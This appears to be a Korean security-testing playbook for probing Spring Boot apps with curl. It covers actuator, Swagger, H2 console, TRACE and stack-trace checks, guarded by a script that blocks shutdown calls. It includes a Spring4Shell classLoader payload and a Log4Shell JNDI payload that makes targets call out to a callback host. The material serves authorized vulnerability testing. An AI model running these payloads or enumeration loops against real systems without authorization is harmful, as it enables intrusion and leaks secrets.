**도구 선택:** curl만 사용. Playwright 불필요.

**[필수] 동적 테스트 전 가드 스크립트:**
```bash
python3 <NOAH_SAST_DIR>/tools/phase2_actuator_check.py "<테스트URL>" && curl -sI "<테스트URL>"
```
exit 1 시 curl 미실행. `/actuator/shutdown` 절대 호출 금지.

---

### 정찰 페이로드

**Spring Boot 식별 (헤더/응답 fingerprint):**
```bash
curl -sI "https://target/" | grep -iE "X-Application-Context|Server"
curl -s "https://target/nonexistent_$(date +%s)" | grep -i "Whitelabel Error Page"
# Whitelabel 에러 페이지 또는 X-Application-Context 헤더 → Spring Boot
```

**Actuator base path 발견:**
```bash
for base in "/actuator" "/management" "/admin" "/monitoring" "/internal/actuator"; do
  python3 <NOAH_SAST_DIR>/tools/phase2_actuator_check.py "https://target${base}" && \
    curl -sI "https://target${base}" | head -1
done
```

**Actuator endpoint enumeration:**
```bash
for ep in env beans configprops mappings prometheus heapdump threaddump httptrace metrics info health auditevents conditions loggers scheduledtasks sessions jolokia; do
  python3 <NOAH_SAST_DIR>/tools/phase2_actuator_check.py "https://target/actuator/${ep}" && \
    curl -sI "https://target/actuator/${ep}" | head -1
done
```

**Swagger/API doc 발견:**
```bash
for path in "/swagger-ui.html" "/swagger-ui/index.html" "/v3/api-docs" "/v2/api-docs" "/api-docs" "/swagger" "/redoc"; do
  curl -sI "https://target${path}" | head -1
done
```

**H2 Console / DevTools 탐지:**
```bash
curl -sI "https://target/h2-console"
curl -sI "https://target/h2-console/"
# DevTools 활성 시 LiveReload 포트 (35729)도 점검
```

---

## 라벨별 테스트

### `TRACE_ENABLED`

```bash
curl -sI -X TRACE https://target/<path>
```

| 응답 | 판정 |
|---|---|
| 200 + `Content-Type: message/http` | 확인됨 |
| 405/501 | 안전 |

### `WHITELABEL_ENABLED`

```bash
curl -s "https://target/nonexistent_$(date +%s)"
```

| 응답 | 판정 |
|---|---|
| `Whitelabel Error Page` 문자열 | 확인됨 |

### `STACKTRACE_EXPOSED`

```bash
curl -s "https://target/nonexistent_$(date +%s)"
curl -s "https://target/<path>?param[=broken"
```

| 응답 | 판정 |
|---|---|
| `java.lang.`, `at org.springframework`, `.java:` 등 stack trace | 확인됨 |

### `SWAGGER_ENABLED`

```bash
for path in "/swagger-ui.html" "/swagger-ui/index.html" "/v3/api-docs" "/v2/api-docs" "/api-docs" "/swagger" "/redoc"; do
  curl -sI "https://target${path}" | head -1
done
```

| 응답 | 판정 |
|---|---|
| 200 OK (하나라도) | 확인됨 |

### `ACTUATOR_EXPOSED`

```bash
python3 <NOAH_SAST_DIR>/tools/phase2_actuator_check.py "https://target/actuator" && \
  curl -s https://target/actuator
```

| 응답 | 판정 |
|---|---|
| 200 + JSON에 `_links` | 확인됨 |

### `ACTUATOR_OVEREXPOSED` (불필요 endpoint 노출)

**shutdown/refresh endpoint는 절대 호출 금지.** 가드 스크립트 통과한 endpoint만:
```bash
for ep in env beans configprops mappings prometheus heapdump threaddump httptrace metrics info health; do
  python3 <NOAH_SAST_DIR>/tools/phase2_actuator_check.py "https://target/actuator/${ep}" && \
    curl -sI "https://target/actuator/${ep}" | head -1
done
```

| endpoint | 영향도 |
|---|---|
| `env`, `configprops` | 환경변수/설정 노출 (DB 비밀번호) |
| `beans`, `mappings` | 애플리케이션 구조 노출 |
| `heapdump`, `threaddump` | 메모리 시크릿/토큰 노출 (영향도 격상) |
| `metrics`, `prometheus` | 운영 정보 노출 |
| `httptrace` | 최근 HTTP 요청 노출 (토큰 포함 가능) |
| `health` | 일반적으로 안전 |
| `info` | 일반적으로 안전 |

### `H2_CONSOLE_ENABLED`

```bash
curl -sI "https://target/h2-console"
curl -sI "https://target/h2-console/"
```

| 응답 | 판정 |
|---|---|
| 200 또는 302 redirect | 확인됨 |

### Spring4Shell (CVE-2022-22965)

```bash
# Spring Framework 5.2/5.3 + JDK 9+ + RequestMapping 객체 바인딩 환경
curl -X POST "https://target/api/x" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bx%7Di"
# 응답 유무로 미패치 환경 추정 (정확 검증은 위험 — 코드 변경 없는 sandbox만)
```

### Log4Shell (CVE-2021-44228)

```bash
# 사용자 입력이 로깅되는 모든 헤더/필드에 JNDI 페이로드
for h in "User-Agent" "Referer" "X-Api-Version" "Authorization"; do
  curl -H "$h: \${jndi:ldap://CALLBACK.oast.fun/x}" "https://target/"
done
# OOB 콜백 수신 시 확인됨
```

---

## 동적 검증 불가 항목

Phase 1 결과 그대로 유지:

| 항목 | 사유 |
|---|---|
| `DAEMON_ROOT` | 런타임 프로세스 권한 — 원격 테스트 불가 |
| `LOG_PERMISSION` | 파일시스템 권한 — 원격 불가 |
| `ADMIN_MBEAN_ENABLED` | JMX 포트 접근 필요 |
| `DEVTOOLS_PROD` | 빌드 설정 분석 결과 유지 |
| `OUTDATED_DEPS` | 버전 분석 결과 유지 |

---

### 참고사항

- `/actuator/shutdown`에 대한 HTTP 요청은 절대 수행 금지 — phase2_actuator_check.py 가드 필수
- actuator endpoint는 shutdown/refresh 외에도 `env`, `beans`, `configprops`, `mappings`, `prometheus`, `heapdump`, `threaddump` 등이 민감
- `heapdump`/`threaddump` 노출은 메모리 내 시크릿/토큰 유출 가능 — 영향도 격상
- Spring Boot 3.x는 2.x와 기본값 일부 다름 — 마이그레이션 환경 특히 주의
- `management.server.port` 별도 포트는 네트워크 격리 없으면 방어 인정 안 됨
- Swagger/springdoc 경로는 `/swagger-ui`, `/v3/api-docs`, `/swagger-ui.html`, `/api-docs` 모두 점검
- H2 Console은 302 redirect도 확인됨 판정 (로그인 페이지로 이동)
- TRACE는 embedded Tomcat이 자체 응답 — `spring.mvc.dispatch-trace-request` 설정과 독립
- Spring4Shell (CVE-2022-22965)은 ssti-scanner에서 별도 검증
- Log4Shell은 사용자 입력이 로깅되는 경로 별도 검증 (ldap-injection `JNDI_LOOKUP`)
- management 포트 분리는 네트워크 레벨 격리 확인 필요 — 코드만으론 부족
- Actuator endpoint enumeration은 자동화 도구 (actuator-testsslnsure 등)도 활용 가능
- Spring Boot 1.x는 actuator 기본 노출 — 2.x부터 health/info만 기본 노출
- Whitelabel 에러 페이지는 stack trace 미노출이라도 framework 식별 가능 — fingerprinting
- `springdoc.api-docs.enabled=false`로 비활성화 가능 — 설정 확인
